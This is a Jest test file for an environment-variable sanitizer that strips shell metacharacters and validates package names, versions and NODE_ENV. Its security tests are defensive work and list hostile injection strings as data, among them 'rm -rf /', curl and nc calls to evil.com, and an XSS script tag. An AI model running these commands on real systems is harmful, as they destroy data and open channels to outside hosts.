import {
  getSafeEnvVar,
  isTestEnvironment,
} from "../../../src/config/env-sanitizer";
import { LOGGER } from "../../../src/logger";

// Mock the logger
jest.mock("../../../src/logger", () => ({
  LOGGER: {
    warn: jest.fn(),
    debug: jest.fn(),
    error: jest.fn(),
    info: jest.fn(),
  },
}));

describe("Environment Variable Sanitizer", () => {
  let originalEnv: NodeJS.ProcessEnv;

  beforeEach(() => {
    // Store original environment
    originalEnv = { ...process.env };
    jest.clearAllMocks();
  });

  afterEach(() => {
    // Restore original environment
    process.env = originalEnv;
  });

  describe("getSafeEnvVar", () => {
    test("should return environment variable when valid", () => {
      process.env.TEST_VAR = "valid_value";
      const result = getSafeEnvVar("TEST_VAR", "default");
      expect(result).toBe("valid_value");
      expect(LOGGER.warn).not.toHaveBeenCalled();
    });

    test("should return default when environment variable not set", () => {
      delete process.env.TEST_VAR;
      const result = getSafeEnvVar("TEST_VAR", "default_value");
      expect(result).toBe("default_value");
      expect(LOGGER.warn).not.toHaveBeenCalled();
    });

    test("should return empty string when no default provided", () => {
      delete process.env.TEST_VAR;
      const result = getSafeEnvVar("TEST_VAR");
      expect(result).toBe("");
    });

    test("should sanitize dangerous characters", () => {
      process.env.TEST_VAR = "value;with&dangerous|chars`$(test)";
      const result = getSafeEnvVar("TEST_VAR", "default");
      expect(result).toBe("valuewithdangerouscharstest");
      expect(LOGGER.warn).toHaveBeenCalledWith(
        "Environment variable 'TEST_VAR' contained potentially dangerous characters and was sanitized",
      );
    });

    test("should trim whitespace", () => {
      process.env.TEST_VAR = "  spaced_value  ";
      const result = getSafeEnvVar("TEST_VAR", "default");
      expect(result).toBe("spaced_value");
    });

    test("should validate npm package name", () => {
      process.env.npm_package_name = "valid-package_name@scope/sub.name";
      const result = getSafeEnvVar("npm_package_name", "default");
      expect(result).toBe("valid-package_name@scope/sub.name");
      expect(LOGGER.warn).not.toHaveBeenCalled();
    });

    test("should reject invalid npm package name", () => {
      process.env.npm_package_name = "invalid package name!";
      const result = getSafeEnvVar("npm_package_name", "default");
      expect(result).toBe("default");
      expect(LOGGER.warn).toHaveBeenCalledWith(
        "Environment variable 'npm_package_name' contained potentially dangerous characters and was sanitized",
      );
      expect(LOGGER.warn).toHaveBeenCalledWith(
        "Environment variable 'npm_package_name' value 'invalid package name' does not match expected pattern",
      );
    });

    test("should validate semantic version", () => {
      process.env.npm_package_version = "1.2.3";
      const result = getSafeEnvVar("npm_package_version", "1.0.0");
      expect(result).toBe("1.2.3");
      expect(LOGGER.warn).not.toHaveBeenCalled();
    });

    test("should validate semantic version with prerelease", () => {
      process.env.npm_package_version = "1.2.3-alpha.1+build.123";
      const result = getSafeEnvVar("npm_package_version", "1.0.0");
      expect(result).toBe("1.2.3-alpha.1+build.123");
      expect(LOGGER.warn).not.toHaveBeenCalled();
    });

    test("should reject invalid semantic version", () => {
      process.env.npm_package_version = "not.a.version";
      const result = getSafeEnvVar("npm_package_version", "1.0.0");
      expect(result).toBe("1.0.0");
      expect(LOGGER.warn).toHaveBeenCalledWith(
        "Environment variable 'npm_package_version' value 'not.a.version' does not match expected pattern",
      );
    });

    test("should validate NODE_ENV values", () => {
      const validValues = ["development", "production", "test"];

      validValues.forEach((env) => {
        process.env.NODE_ENV = env;
        const result = getSafeEnvVar("NODE_ENV", "development");
        expect(result).toBe(env);
      });

      expect(LOGGER.warn).not.toHaveBeenCalled();
    });

    test("should reject invalid NODE_ENV values", () => {
      process.env.NODE_ENV = "invalid_env";
      const result = getSafeEnvVar("NODE_ENV", "development");
      expect(result).toBe("development");
      expect(LOGGER.warn).toHaveBeenCalledWith(
        "Environment variable 'NODE_ENV' value 'invalid_env' does not match expected pattern",
      );
    });
  });

  describe("isTestEnvironment", () => {
    test("should return true when NODE_ENV is test", () => {
      process.env.NODE_ENV = "test";
      const result = isTestEnvironment();
      expect(result).toBe(true);
    });

    test("should return false when NODE_ENV is development", () => {
      process.env.NODE_ENV = "development";
      const result = isTestEnvironment();
      expect(result).toBe(false);
    });

    test("should return false when NODE_ENV is production", () => {
      process.env.NODE_ENV = "production";
      const result = isTestEnvironment();
      expect(result).toBe(false);
    });

    test("should return false when NODE_ENV is not set", () => {
      delete process.env.NODE_ENV;
      const result = isTestEnvironment();
      expect(result).toBe(false);
    });

    test("should return false when NODE_ENV is invalid", () => {
      process.env.NODE_ENV = "invalid";
      const result = isTestEnvironment();
      expect(result).toBe(false);
    });
  });

  describe("Security tests", () => {
    test("should prevent command injection attempts", () => {
      const maliciousInputs = [
        "value;rm -rf /",
        "value && curl evil.com",
        "value | nc evil.com 1337",
        "value`curl evil.com`",
        "value$(curl evil.com)",
        "value<script>alert('xss')</script>",
        "value>output.txt",
      ];

      maliciousInputs.forEach((input) => {
        process.env.MALICIOUS_VAR = input;
        const result = getSafeEnvVar("MALICIOUS_VAR", "safe");

        // Should not contain dangerous characters
        expect(result).not.toMatch(/[;&|`$()<>]/);
        expect(LOGGER.warn).toHaveBeenCalledWith(
          "Environment variable 'MALICIOUS_VAR' contained potentially dangerous characters and was sanitized",
        );
      });
    });

    test("should handle extremely long environment variables", () => {
      const longValue = "a".repeat(10000);
      process.env.LONG_VAR = longValue;
      const result = getSafeEnvVar("LONG_VAR", "default");
      expect(result).toBe(longValue);
    });

    test("should handle empty string values", () => {
      process.env.EMPTY_VAR = "";
      const result = getSafeEnvVar("EMPTY_VAR", "default");
      expect(result).toBe("default"); // Empty strings should use default value
    });

    test("should handle unicode characters safely", () => {
      process.env.UNICODE_VAR = "héllo_wörld_🚀";
      const result = getSafeEnvVar("UNICODE_VAR", "default");
      expect(result).toBe("héllo_wörld_🚀");
    });
  });
});
